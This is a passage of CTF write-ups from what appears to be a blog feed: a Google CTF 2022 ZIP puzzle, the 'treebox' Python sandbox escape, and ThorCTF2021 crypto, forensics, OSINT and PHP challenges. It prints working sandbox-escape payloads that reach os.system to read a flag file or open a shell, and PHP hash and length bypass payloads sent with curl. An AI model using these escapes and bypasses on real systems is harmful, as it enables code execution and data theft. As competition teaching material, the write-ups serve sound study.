a needle in the haystack... hi.txtPK flag00aPK flag00PK flag00bPK flag00PK flag00cPK flag00PK flag00dPK flag00PK flag00ePK ...... flag18PK flag181PK flag18PK flag183PK flag18PK flag187PK flag18PK flag18&#125;PK flag18PK flag18_PK flag18PK ~$ hexdump -C dump.zip | head -n 30 00000000 50 4b 03 04 00 00 00 00 00 00 00 00 00 00 56 7e |PK............V~| 00000010 75 4b 29 00 00 00 29 00 00 00 09 00 00 00 68 65 |uK)...).......he| 00000020 6c 6c 6f 2e 74 78 74 54 68 65 72 65 27 73 20 6d |llo.txtThere&#39;s m| 00000030 6f 72 65 20 74 6f 20 69 74 20 74 68 61 6e 20 6d |ore to it than m| 00000040 65 65 74 73 20 74 68 65 20 65 79 65 2e 2e 2e 0a |eets the eye....| 00000050 50 4b 01 02 00 00 00 00 00 00 00 00 00 00 00 00 |PK..............| 00000060 56 7e 75 4b 29 00 00 00 29 00 00 00 09 00 00 00 |V~uK)...).......| 00000070 fd ef 00 00 00 00 00 00 00 00 00 00 00 00 68 65 |..............he| 00000080 6c 6c 6f 2e 74 78 74 50 4b 03 04 00 00 00 00 00 |llo.txtPK.......| 00000090 00 00 00 00 00 9a 15 62 e9 21 00 00 00 21 00 00 |.......b.!...!..| 000000a0 00 06 00 00 00 68 69 2e 74 78 74 46 69 6e 64 20 |.....hi.txtFind | 000000b0 61 20 6e 65 65 64 6c 65 20 69 6e 20 74 68 65 20 |a needle in the | 000000c0 68 61 79 73 74 61 63 6b 2e 2e 2e 0a 50 4b 01 02 |haystack....PK..| 000000d0 00 00 00 00 00 00 00 00 00 00 00 00 9a 15 62 e9 |..............b.| 000000e0 21 00 00 00 21 00 00 00 06 00 00 00 84 ef 00 00 |!...!...........| 000000f0 00 00 00 00 00 00 87 00 00 00 68 69 2e 74 78 74 |..........hi.txt| 00000100 50 4b 03 04 00 00 00 00 00 00 00 00 00 00 43 be |PK............C.| 00000110 b7 e8 01 00 00 00 01 00 00 00 06 00 00 00 66 6c |..............fl| 00000120 61 67 30 30 61 50 4b 01 02 00 00 00 00 00 00 00 |ag00aPK.........| 00000130 00 00 00 00 00 43 be b7 e8 01 00 00 00 01 00 00 |.....C..........| 00000140 00 06 00 00 00 2b ef 00 00 00 00 00 00 00 00 00 |.....+..........| 00000150 01 00 00 66 6c 61 67 30 30 50 4b 03 04 00 00 00 |...flag00PK.....| 00000160 00 00 00 00 00 00 00 f9 ef be 71 01 00 00 00 01 |..........q.....| 00000170 00 00 00 06 00 00 00 66 6c 61 67 30 30 62 50 4b |.......flag00bPK| 00000180 01 02 00 00 00 00 00 00 00 00 00 00 00 00 f9 ef |................| 00000190 be 71 01 00 00 00 01 00 00 00 06 00 00 00 d2 ee |.q..............| 000001a0 00 00 00 00 00 00 00 00 59 01 00 00 66 6c 61 67 |........Y...flag| 000001b0 30 30 50 4b 03 04 00 00 00 00 00 00 00 00 00 00 |00PK............| 000001c0 6f df b9 06 01 00 00 00 01 00 00 00 06 00 00 00 |o...............| 000001d0 66 6c 61 67 30 30 63 50 4b 01 02 00 00 00 00 00 |flag00cPK.......| 参照ZIP文件格式,按照504B0304、504B0102、504B0506分隔dump.zip的十六进制表示形式,分析发现: hello.txt和hi.txt一共占用256字节 flagXX的文件实体为37字节、目录源数据为52字节 每组flagXX共占用(37 + 53) * 36字节 发现结尾多了18个目录数据源结束标识,猜测可能以此还原文件,以flag00为例: 目录源数据的开始位置偏移为0x880A0000,用小端表示为0x00000A88(2696),减去hello.txt和hi.txt的256字节,减去第一个文件实体的37字节,然后除以(37+52)得到27,指向flag00这一组的第27个文件实体(从0开始),即字符C.基于flag的格式以C开头,大胆猜测这就是正确答案. 剩下的过程与之类似,可以使用脚本简化: data = &quot;&quot;&quot;\\ 880A0000 65170000 42240000 BB2F0000 6C380000 274A0000 7F520000 3A640000 71690000 377C0000 587F0000 F1950000 3E9D0000 5EA80000 88BC0000 92C50000 2CD40000 20DB0000 3FEE0000 &quot;&quot;&quot;.split() print(len(data)) CHOICES = &#39;abcdefghijklmnopqrstuvwxyz&#123;CTF0137&#125;_&#39; ans = list() def conv(s): # 大端转小端 a = [s[2 * i:2 * (i + 1)] for i in range(len(s) // 2)] a.reverse() return &#39;&#39;.join(a) for i,item in enumerate(data): t = int(conv(item), 16) - 256 - 37 tt = t // (37 + 52) ttt = tt - 36 * i ans.append(CHOICES[ttt]) print(&#39;&#39;.join(ans)) flag:CTF&#123;p0s7m0d3rn_z1p&#125; 参考 从做CTF题到手撕ZIP ZIP格式分析 .ZIP File Format Specification TREEBOXI think I finally got Python sandboxing right. Attachment treebox.2022.ctfcompetition.com 1337 treebox.py #!/usr/bin/python3 -u # # Flag is in a file called &quot;flag&quot; in cwd. # # Quote from Dockerfile: # FROM ubuntu:22.04 # RUN apt-get update &amp;&amp; apt-get install -y python3 # import ast import sys import os def verify_secure(m): for x in ast.walk(m): match type(x): case (ast.Import|ast.ImportFrom|ast.Call): print(f&quot;ERROR: Banned statement &#123;x&#125;&quot;) return False return True abspath = os.path.abspath(__file__) dname = os.path.dirname(abspath) os.chdir(dname) print(&quot;-- Please enter code (last line must contain only --END)&quot;) source_code = &quot;&quot; while True: line = sys.stdin.readline() if line.startswith(&quot;--END&quot;): break source_code += line tree = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;, flags=ast.PyCF_ONLY_AST) if verify_secure(tree): # Safe to execute! print(&quot;-- Executing safe code:&quot;) compiled = compile(source_code, &quot;input.py&quot;, &#39;exec&#39;) exec(compiled) 阅读源码,可以发现: flag在当前工作目录下一个名为flag的文件 我们可以通过exec执行任意代码,但必须通过verify_secure函数的检查 verify_secure使用ast模块进行分析,不能有显式的函数调用和导入语句 os和sys模块可用 思路: os模块已经导入,我们可以通过os.system()方法来执行系统命令 借助于Python机制,通过非显式的方式地来调用函数,如内置函数、重载运算符、解释器Hook 我的解法: 在python中使用in运算符时,默认会调用__contains__方法,并且会将需要判断的对象作为形参传入; 所以我们可以用os.system覆盖现有的python对象&#x2F;类上的__contains__方法,然后通过运算符来调用system函数. os.environ.__class__.__contains__ = os.system &#39;cat flag&#39; in os.environ 其他解法: 装饰器 @exec @input class X: pass 异常 class MyException(Exception): def __str__(self): return &#39;cat flag&#39; sys.stdout.write=os.system sys.stderr.write=os.system raise MyException class X: def __init__(self, a, b, c): self += &quot;os.system(&#39;sh&#39;)&quot; __iadd__ = exec sys.excepthook = X 1/0 元类 # This will define the members on the &quot;sub&quot;class class Metaclass: __getitem__ = exec # So Sub[string] will execute exec(string) # Note: Metaclass.__class__ == type class Sub(metaclass=Metaclass): # That&#39;s how we make Sub.__class__ == Metaclass pass # Nothing special to do assert isinstance(Sub, Metaclass) sub[&#39;import os; os.system(&quot;sh&quot;)&#39;] 其他Writeup GCTF 2022 Treebox flag:CTF&#123;CzeresniaTopolaForsycja&#125;","date_published":"2022-07-02T02:27:43.000Z","tags":["CTF","CTF","GoogleCTF"]},{"id":"https://zhaoqi.vip/posts/1756116899/","url":"https://zhaoqi.vip/posts/1756116899/","title":"ThorCTF2021 Writeup","content_html":"<h1 id=\"Shingeki-no-RSA\"><a href=\"#Shingeki-no-RSA\" class=\"headerlink\" title=\"Shingeki no RSA\"></a>Shingeki no RSA</h1><p><em>One encryption, three params, you know what to do.</em></p>\n<p><a href=\"https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing\">https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing</a></p>\n<hr>\n<p>题目给了一个<code>out.txt</code>,里面包含<code>n</code>,<code>e</code>,<code>c</code>的值</p>\n<p>使用<a href=\"https://github.com/pablocelayes/rsa-wiener-attack\">rsa-wiener-attack</a>破解得到d的值</p>\n<pre><code class=\"shell\">~$ python RSAwienerHacker.py\nHacked!\n50954488565980029757584514143249292352586758895690937600871123296191815851393\n</code></pre>\n<p>代码:</p>\n<pre><code class=\"python\">from Crypto.Util.number import long_to_bytes\nimport gmpy2\ne = 573539981054118375159951884901136205381955275096471242113613923667834312363548126598981740314307696033323138227176735824259098674326069670063001503892366653022633390483272968412233602239104757299239510751275655288670147128536527296060843927282827574422039154045360669647002461865276005609405093376965933104257\nn = 666012509503758414438426745752029036046328310944346357068259451859585174290580664150188141697939659811599336002592599704089746160399428670863696780761420173279676565150259812749267725206078003773597631925996185977321417456827136083352043009732414371490356153874019687554196902819696964658218055292422529903061\nc = 208271638964220806986932660131544686073844142913497222151993342727885811478884727510239109595118929917803309949401762080874858518281133929171859315997601484068462684780596513932104673255797873067799046024798017005908221308124294210078684387266545107254593378287958436606968619452939117043031695740389528821956\nd = 50954488565980029757584514143249292352586758895690937600871123296191815851393\nm = gmpy2.powmod(c, d, n)\nprint(long_to_bytes(m))\n</code></pre>\n<p><strong>flag:</strong><code>SBCTF&#123;d1d_y0u_us3_w13n3r&#39;s?&#125;</code></p>\n<h1 id=\"Happy-Flag\"><a href=\"#Happy-Flag\" class=\"headerlink\" title=\"Happy Flag\"></a>Happy Flag</h1><p><em>We have many flags. But we need a good flag!</em></p>\n<p><a href=\"https://drive.google.com/file/d/1194sBi8Ijb4C-cYDGP2qZvXgj9uxSe7R/view?usp=sharing\">https://drive.google.com/file/d/1194sBi8Ijb4C-cYDGP2qZvXgj9uxSe7R/view?usp=sharing</a></p>\n<hr>\n<p>题目给了一个文件<code>world_flags.zeep</code>,<code>file</code>后发现是一个zip压缩文件,使用<code>unzip</code>解压.</p>\n<p>解压后发现有</p>\n<pre><code class=\"shell\">~$ file world_flags.zeep\nworld_flags.zeep: Zip archive data, at least v1.0 to extract\n~$ unzip world_flags.zeep\nArchive:  world_flags.zeep\n   creating: world_flags/\n  inflating: world_flags/1.txt       \n  inflating: world_flags/10.txt      \n  inflating: world_flags/100.txt     \n  inflating: world_flags/1000.txt    \n  inflating: world_flags/10000.txt   \n  inflating: world_flags/10001.txt\n  ....\n</code></pre>\n<p>直接<code>cat</code>所有文件,然后用<code>uniq</code>去重</p>\n<pre><code class=\"shell\">~$ cat *.txt | uniq\nSBGTF&#123;false_flag_🥺&#125; \nSBCTF&#123;Cool_flag_!!!&#125;\n</code></pre>\n<p><strong>flag:</strong><code>SBCTF&#123;Cool_flag_!!!&#125;</code></p>\n<h1 id=\"Query-The-Flag\"><a href=\"#Query-The-Flag\" class=\"headerlink\" title=\"Query The Flag\"></a>Query The Flag</h1><p><em>Query the flag</em></p>\n<p><em><a href=\"https://drive.google.com/file/d/1pwr09e-BoNoJujrJJ_hlAuhEGgJnsb6V/view?usp=sharing\">https://drive.google.com/file/d/1pwr09e-BoNoJujrJJ_hlAuhEGgJnsb6V/view?usp=sharing</a></em></p>\n<hr>\n<p>题目给了一个SQLite的数据库文件,直接grep</p>\n<pre><code class=\"shell\">~$ strings find.db | grep SBCTF                           \nSBCTF&#123;I_w@s_s0_sl33py_D3s1gn1ng_7h1s&#125;NULL\n</code></pre>\n<p><strong>flag:</strong><code>SBCTF&#123;I_w@s_s0_sl33py_D3s1gn1ng_7h1s&#125;</code></p>\n<h1 id=\"they-all-look-the-same\"><a href=\"#they-all-look-the-same\" class=\"headerlink\" title=\"they all look the same\"></a>they all look the same</h1><p><em>They are slightly different</em></p>\n<p><a href=\"https://drive.google.com/file/d/1XjkSCEjydggD7FHaWsBxKYTrivyesd1M/view?usp=sharing\">https://drive.google.com/file/d/1XjkSCEjydggD7FHaWsBxKYTrivyesd1M/view?usp=sharing</a></p>\n<hr>\n<p>解压下载的zip文件,发现里面一堆jpg文件,首先看看md5值</p>\n<pre><code class=\"shell\">~$ md5 *\nMD5 (images - Copy (1).jpg) = b69410fdc3f11fbac6bb3e32e40df1de\nMD5 (images - Copy (10).jpg) = 1aa6e81b2335fdee91492125d4352503\nMD5 (images - Copy (100).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66\nMD5 (images - Copy (101).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66\nMD5 (images - Copy (102).jpg) = 592434721909e841870ba0cfc0bce6aa\nMD5 (images - Copy (103).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66\nMD5 (images - Copy (104).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66\nMD5 (images - Copy (105).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66\n</code></pre>\n<p>然后用<code>exiftool</code>查看文件的元数据试试</p>\n<pre><code class=\"shell\">~$ exiftool images\\ -\\ Copy\\ \\(1\\).jpg\nExifTool Version Number         : 12.31\nFile Name                       : images - Copy (1).jpg\nDirectory                       : .\nFile Size                       : 16 KiB\nFile Modification Date/Time     : 2021:11:21 00:21:28+08:00\nFile Access Date/Time           : 2021:12:10 09:32:26+08:00\nFile Inode Change Date/Time     : 2021:12:10 09:32:26+08:00\nFile Permissions                : -rw-r--r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nJFIF Version                    : 1.01\nResolution Unit                 : inches\nX Resolution                    : 96\nY Resolution                    : 96\nExif Byte Order                 : Big-endian (Motorola, MM)\nImage Description               : S\nXP Title                        : S\nPadding                         : (Binary data 2060 bytes, use -b option to extract)\nAbout                           : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b\nTitle                           : S\nDescription                     : S\nImage Width                     : 376\nImage Height                    : 134\nEncoding Process                : Baseline DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\nImage Size                      : 376x134\nMegapixels                      : 0.050\n</code></pre>\n<p>发现<code>Image Description</code>里有一个S,顺序打印一下所有文件的<code>Image Description</code>试试</p>\n<pre><code class=\"shell\">~$ for i in `seq 1 153`;do exiftool images\\ -\\ Copy\\ \\($&#123;i&#125;\\).jpg| grep &quot;Image Description&quot;;done\nImage Description               : S\nImage Description               : B\nImage Description               : C\nImage Description               : T\nImage Description               : F\nImage Description               : &#123;\nImage Description               : H\nImage Description               : 0\nImage Description               : w\n....\n\n~$ cat tmp |  awk &#39;&#123;print $4&#125;&#39; | xargs echo\nS B C T F &#123; H 0 w _ c 0 u l d _ y 0 u _ d ! s t ! n g u ! s h S _ S S S ! S S S m S S S @ S S S g S S S 3 S S S s S S S _ S S S\n</code></pre>\n<p>结尾似乎有一些多余的S,去掉后即可得到flag</p>\n<p><strong>flag:</strong><code>SBCTF&#123;H0w_c0uld_y0u_d!st!ngu!sh_!m@g3s_&#125;</code></p>\n<h1 id=\"Discord\"><a href=\"#Discord\" class=\"headerlink\" title=\"Discord\"></a>Discord</h1><p><em>Find the account creation date of one of our discord channel admins (4dam).</em></p>\n<p><em>Note: Please put the date in this format YYYY&#x2F;MM&#x2F;DD for submission, like this: SBCTF{1970&#x2F;01&#x2F;01}</em></p>\n<hr>\n<p>题目要求我们找到管理员<code>4dam</code>创建账号的时间.</p>\n<p>首先打开Discord-&gt;:gear:-&gt;高级设置,打开“开发者模式”</p>\n<p><img data-src=\"/../../CTF/ThorCTF2021/Osint/images/image-20211209130044097.png\" alt=\"image-20211209130044097\"></p>\n<p>对着头像右键,复制ID(<code>808684903301775360</code>)</p>\n<p><img data-src=\"/../../CTF/ThorCTF2021/Osint/images/image-20211209130410067.png\" alt=\"image-20211209130410067\"></p>\n<p>打开<a href=\"https://snowsta.mp/?l=zh-cn&z=5&f=ht4idgkcy7-11s\">https://snowsta.mp</a>,输入ID查询</p>\n<p><img data-src=\"/../../CTF/ThorCTF2021/Osint/images/image-20211209131027396.png\" alt=\"image-20211209131027396\"></p>\n<p><strong>flag:</strong><code>SBCTF&#123;2020/02/09&#125;</code></p>\n<h1 id=\"Email-Hunt\"><a href=\"#Email-Hunt\" class=\"headerlink\" title=\"Email Hunt\"></a>Email Hunt</h1><p><em>I want to find the PGP Public Key of someone’s ProtonMail account, but all I got is a useless document he shared with me (<a href=\"https://docs.google.com/spreadsheets/d/1iBRs347v5xXICdgHm4-sQBEFozbqhTABPIespxSBI20\">https://docs.google.com/spreadsheets/d/1iBRs347v5xXICdgHm4-sQBEFozbqhTABPIespxSBI20</a>).</em><br><em>Can you help me find it?</em></p>\n<p><em>Note: Please submit the flag like this example:</em></p>\n<pre><code class=\"asciiarmor\">-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: ProtonMail\n\naBBBBBBBBBBBBBBBB\nBBBBBBBBBBBBBBBBB\nBBBBYz\n-----END PGP PUBLIC KEY BLOCK-----\n</code></pre>\n<p><em>Flag: SBCTF{aBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBYz}</em></p>\n<hr>\n<p>访问题目中给出的Google表格的链接.</p>\n<p>然后访问<a href=\"https://docs.google.com/spreadsheets/u/0/\">https://docs.google.com/spreadsheets/u/0/</a>查看最近访问的表格文件,并用F12抓包</p>\n<p><img data-src=\"/../../CTF/ThorCTF2021/Osint/images/image-20211208101433762.png\" alt=\"image-20211208101433762\"></p>\n<p>找到Gmail邮箱<code>priv4te3mail0fmr.8@gmail.com</code></p>\n<p>题目要求我们找到ProtonMail账号的PGP公钥,猜测邮箱前缀可能一样,即<code>priv4te3mail0fmr.8@protonmail.com</code></p>\n<p>参照<a href=\"https://protonmail.com/support/knowledge-base/download-public-private-key/\">https://protonmail.com/support/knowledge-base/download-public-private-key/</a>,下载PGP公钥</p>\n<pre><code class=\"shell\">~$ wget https://api.protonmail.ch/pks/lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com\n--2021-12-08 10:43:59--  https://api.protonmail.ch/pks/lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com\n正在解析主机 api.protonmail.ch (api.protonmail.ch)... 185.70.42.25\n正在连接 api.protonmail.ch (api.protonmail.ch)|185.70.42.25|:443... 已连接。\n已发出 HTTP 请求，正在等待回应... 200 OK\n长度：709 [application/pgp-keys]\n正在保存至: “lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com”\n\nlookup?op=get&amp;search=priv4te3mail0fmr 100%[========================================================================&gt;]     709  --.-KB/s  用时 0s\n\n2021-12-08 10:44:00 (225 MB/s) - 已保存 “lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com” [709/709])\n~$ cat lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com\n-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: ProtonMail\n\nxjMEYZcIIhYJKwYBBAHaRw8BAQdAgXzkYJTBPtkxMSemLogafK1ryTzAsPoU\nbjT8hQ6Wc4XNRXByaXY0dGUzbWFpbDBmbXIuOEBwcm90b25tYWlsLmNvbSA8\ncHJpdjR0ZTNtYWlsMGZtci44QHByb3Rvbm1haWwuY29tPsKPBBAWCgAgBQJh\nlwgiBgsJBwgDAgQVCAoCBBYCAQACGQECGwMCHgEAIQkQBcfjCjlf+3IWIQRS\nLQS+kFOUoSEmSs4Fx+MKOV/7cgCtAP0dhlLk+UMY9FBnN/SiR+nIObn0q4f/\nAS2k8kRvuA9cQgEA13kb1fTDmIGXp/rkTh9MSUt22m6rF5khiOr9yCYoTQrO\nOARhlwgiEgorBgEEAZdVAQUBAQdARRDPDTZcD3gJkaXMzYOSGcLSY0M8PEMs\n8w0eI9ydnxcDAQgHwngEGBYIAAkFAmGXCCICGwwAIQkQBcfjCjlf+3IWIQRS\nLQS+kFOUoSEmSs4Fx+MKOV/7ckoLAQCjmVOWyFLflAz5dCinOZI0G8yOsduV\n8PSw2hvTeyiZMwEAkl9U2tmg2i/XW5PckxqvNgxAZZkkEoQPWa6UpKICIw8=\n=E+gi\n-----END PGP PUBLIC KEY BLOCK-----\n</code></pre>\n<p><strong>flag:</strong><code>SBCTF&#123;xjMEYZcIIhYJKwYBBAHaRw8BAQdAgXzkYJTBPtkxMSemLogafK1ryTzAsPoUbjT8hQ6Wc4XNRXByaXY0dGUzbWFpbDBmbXIuOEBwcm90b25tYWlsLmNvbSA8cHJpdjR0ZTNtYWlsMGZtci44QHByb3Rvbm1haWwuY29tPsKPBBAWCgAgBQJhlwgiBgsJBwgDAgQVCAoCBBYCAQACGQECGwMCHgEAIQkQBcfjCjlf+3IWIQRSLQS+kFOUoSEmSs4Fx+MKOV/7cgCtAP0dhlLk+UMY9FBnN/SiR+nIObn0q4f/AS2k8kRvuA9cQgEA13kb1fTDmIGXp/rkTh9MSUt22m6rF5khiOr9yCYoTQrOOARhlwgiEgorBgEEAZdVAQUBAQdARRDPDTZcD3gJkaXMzYOSGcLSY0M8PEMs8w0eI9ydnxcDAQgHwngEGBYIAAkFAmGXCCICGwwAIQkQBcfjCjlf+3IWIQRSLQS+kFOUoSEmSs4Fx+MKOV/7ckoLAQCjmVOWyFLflAz5dCinOZI0G8yOsduV8PSw2hvTeyiZMwEAkl9U2tmg2i/XW5PckxqvNgxAZZkkEoQPWa6UpKICIw8==E+gi&#125;</code></p>\n<h1 id=\"Tricks-1\"><a href=\"#Tricks-1\" class=\"headerlink\" title=\"Tricks 1\"></a>Tricks 1</h1><p><em>A couple of PHP Tricks, give it a try.</em></p>\n<hr>\n<pre><code class=\"php\"> &lt;?php\n    error_reporting(0);\n\n    if (isset($_GET[&quot;a&quot;]) &amp;&amp; isset($_GET[&quot;b&quot;])) &#123;\n        if ($_GET[&quot;a&quot;] !== $_GET[&quot;b&quot;] &amp;&amp; sha1($_GET[&quot;a&quot;]) === sha1($_GET[&quot;b&quot;])) &#123;\n            if ($_GET[&quot;a&quot;] !== $_GET[&quot;b&quot;] &amp;&amp; md5($_GET[&quot;a&quot;]) === md5($_GET[&quot;b&quot;])) &#123;\n                $flag = file_get_contents(&quot;../../flag&quot;);\n                echo $flag;\n            &#125;else &#123;\n                echo &quot;Didn&#39;t get passed MD5.&quot;;\n            &#125;\n        &#125;else &#123;\n            echo &quot;Didn&#39;t get passed SHA1.&quot;;\n        &#125;\n    &#125;else &#123;\n        highlight_file(__FILE__);\n        die();\n    &#125;\n?&gt; \n</code></pre>\n<p><code>md5</code>和<code>sha1\t</code>不能用来处理数组,<code>md5(arr)</code>和<code>sha1(arr)</code>会返回null</p>\n<p><strong>payload</strong>: <code>a[]=a&amp;b[]=b</code></p>\n<pre><code class=\"shell\">~$ curl &quot;https://ch5.sbug.se/?a[]=a&amp;b[]=b&quot;\nSBCTF&#123;g07_2_w17h_0n3_SH07?&#125;\n</code></pre>\n<p><strong>flag:</strong><code>SBCTF&#123;g07_2_w17h_0n3_SH07?&#125;</code></p>\n<h1 id=\"Tricks-2\"><a href=\"#Tricks-2\" class=\"headerlink\" title=\"Tricks 2\"></a>Tricks 2</h1><p><em>Another  round of PHP Tricks, good luck.</em></p>\n<hr>\n<pre><code class=\"php\">&lt;?php error_reporting(0);\nif (isset($_GET[&#39;a&#39;]) &amp;&amp; isset($_GET[&#39;b&#39;])) &#123;\n    if (  strlen($_GET[&#39;a&#39;]) &gt;  mb_strlen($_GET[&#39;b&#39;], base64_decode(&#39;dXRmOA==&#39;) )) &#123;\n        if (strlen($_GET[&#39;b&#39;]) &gt; mb_strlen($_GET[&#39;a&#39;], base64_decode(&#39;dXRmOA==&#39;))) &#123;\n            $u327a6c4304ad5938 = file_get_contents(base64_decode(&#39;Li4vLi4vZmxhZw==&#39;));\n            echo $u327a6c4304ad5938;\n        &#125; else &#123;\n            echo base64_decode(&#39;QWxyaWdodC4=&#39;);\n        &#125;\n    &#125; else &#123;\n        echo base64_decode(&#39;VHJ5IGhhcmRlci4=&#39;);\n    &#125;\n&#125; else &#123;\n    highlight_file(__FILE__);\n    die();\n&#125; ?&gt;\n</code></pre>\n<p><a href=\"https://www.php.net/manual/zh/function.strlen.php\">strlen</a>返回的是字符串的字节数，而不是其中字符的数量.</p>\n<p><a href=\"https://www.php.net/manual/zh/function.mb-strlen.php\">mb-strlen</a> 用来获取字符串的长度,多字节的字符被计为1.</p>\n<p>因此这里用多字节字符作为参数即可</p>\n<p><strong>payload</strong>: <code>a=大&amp;b=大</code></p>\n<pre><code class=\"shell\">$ curl &quot;https://ch6.sbug.se/?a=大&amp;b=大&quot;\nSBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;\n</code></pre>\n<p><strong>flag:</strong><code>SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;</code></p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>","content_text":"Shingeki no RSAOne encryption, three params, you know what to do. https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing 题目给了一个out.txt,里面包含n,e,c的值 使用rsa-wiener-attack破解得到d的值 ~$ python RSAwienerHacker.py Hacked! 50954488565980029757584514143249292352586758895690937600871123296191815851393 代码: from Crypto.Util.number import long_to_bytes import gmpy2 e = 573539981054118375159951884901136205381955275096471242113613923667834312363548126598981740314307696033323138227176735824259098674326069670063001503892366653022633390483272968412233602239104757299239510751275655288670147128536527296060843927282827574422039154045360669647002461865276005609405093376965933104257 n = 666012509503758414438426745752029036046328310944346357068259451859585174290580664150188141697939659811599336002592599704089746160399428670863696780761420173279676565150259812749267725206078003773597631925996185977321417456827136083352043009732414371490356153874019687554196902819696964658218055292422529903061 c = 208271638964220806986932660131544686073844142913497222151993342727885811478884727510239109595118929917803309949401762080874858518281133929171859315997601484068462684780596513932104673255797873067799046024798017005908221308124294210078684387266545107254593378287958436606968619452939117043031695740389528821956 d = 50954488565980029757584514143249292352586758895690937600871123296191815851393 m = gmpy2.powmod(c, d, n) print(long_to_bytes(m)) flag:SBCTF&#123;d1d_y0u_us3_w13n3r&#39;s?&#125; Happy FlagWe have many flags. But we need a good flag! https://drive.google.com/file/d/1194sBi8Ijb4C-cYDGP2qZvXgj9uxSe7R/view?usp=sharing 题目给了一个文件world_flags.zeep,file后发现是一个zip压缩文件,使用unzip解压. 解压后发现有 ~$ file world_flags.zeep world_flags.zeep: Zip archive data, at least v1.0 to extract ~$ unzip world_flags.zeep Archive: world_flags.zeep creating: world_flags/ inflating: world_flags/1.txt inflating: world_flags/10.txt inflating: world_flags/100.txt inflating: world_flags/1000.txt inflating: world_flags/10000.txt inflating: world_flags/10001.txt .... 直接cat所有文件,然后用uniq去重 ~$ cat *.txt | uniq SBGTF&#123;false_flag_🥺&#125; SBCTF&#123;Cool_flag_!!!&#125; flag:SBCTF&#123;Cool_flag_!!!&#125; Query The FlagQuery the flag https://drive.google.com/file/d/1pwr09e-BoNoJujrJJ_hlAuhEGgJnsb6V/view?usp=sharing 题目给了一个SQLite的数据库文件,直接grep ~$ strings find.db | grep SBCTF SBCTF&#123;I_w@s_s0_sl33py_D3s1gn1ng_7h1s&#125;NULL flag:SBCTF&#123;I_w@s_s0_sl33py_D3s1gn1ng_7h1s&#125; they all look the sameThey are slightly different https://drive.google.com/file/d/1XjkSCEjydggD7FHaWsBxKYTrivyesd1M/view?usp=sharing 解压下载的zip文件,发现里面一堆jpg文件,首先看看md5值 ~$ md5 * MD5 (images - Copy (1).jpg) = b69410fdc3f11fbac6bb3e32e40df1de MD5 (images - Copy (10).jpg) = 1aa6e81b2335fdee91492125d4352503 MD5 (images - Copy (100).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66 MD5 (images - Copy (101).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66 MD5 (images - Copy (102).jpg) = 592434721909e841870ba0cfc0bce6aa MD5 (images - Copy (103).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66 MD5 (images - Copy (104).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66 MD5 (images - Copy (105).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66 然后用exiftool查看文件的元数据试试 ~$ exiftool images\\ -\\ Copy\\ \\(1\\).jpg ExifTool Version Number : 12.31 File Name : images - Copy (1).jpg Directory : . File Size : 16 KiB File Modification Date/Time : 2021:11:21 00:21:28+08:00 File Access Date/Time : 2021:12:10 09:32:26+08:00 File Inode Change Date/Time : 2021:12:10 09:32:26+08:00 File Permissions : -rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Resolution Unit : inches X Resolution : 96 Y Resolution : 96 Exif Byte Order : Big-endian (Motorola, MM) Image Description : S XP Title : S Padding : (Binary data 2060 bytes, use -b option to extract) About : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b Title : S Description : S Image Width : 376 Image Height : 134 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 376x134 Megapixels : 0.050 发现Image Description里有一个S,顺序打印一下所有文件的Image Description试试 ~$ for i in `seq 1 153`;do exiftool images\\ -\\ Copy\\ \\($&#123;i&#125;\\).jpg| grep &quot;Image Description&quot;;done Image Description : S Image Description : B Image Description : C Image Description : T Image Description : F Image Description : &#123; Image Description : H Image Description : 0 Image Description : w .... ~$ cat tmp | awk &#39;&#123;print $4&#125;&#39; | xargs echo S B C T F &#123; H 0 w _ c 0 u l d _ y 0 u _ d ! s t ! n g u ! s h S _ S S S ! S S S m S S S @ S S S g S S S 3 S S S s S S S _ S S S 结尾似乎有一些多余的S,去掉后即可得到flag flag:SBCTF&#123;H0w_c0uld_y0u_d!st!ngu!sh_!m@g3s_&#125; DiscordFind the account creation date of one of our discord channel admins (4dam). Note: Please put the date in this format YYYY&#x2F;MM&#x2F;DD for submission, like this: SBCTF{1970&#x2F;01&#x2F;01} 题目要求我们找到管理员4dam创建账号的时间. 首先打开Discord-&gt;:gear:-&gt;高级设置,打开“开发者模式” 对着头像右键,复制ID(808684903301775360) 打开https://snowsta.mp,输入ID查询 flag:SBCTF&#123;2020/02/09&#125; Email HuntI want to find the PGP Public Key of someone’s ProtonMail account, but all I got is a useless document he shared with me 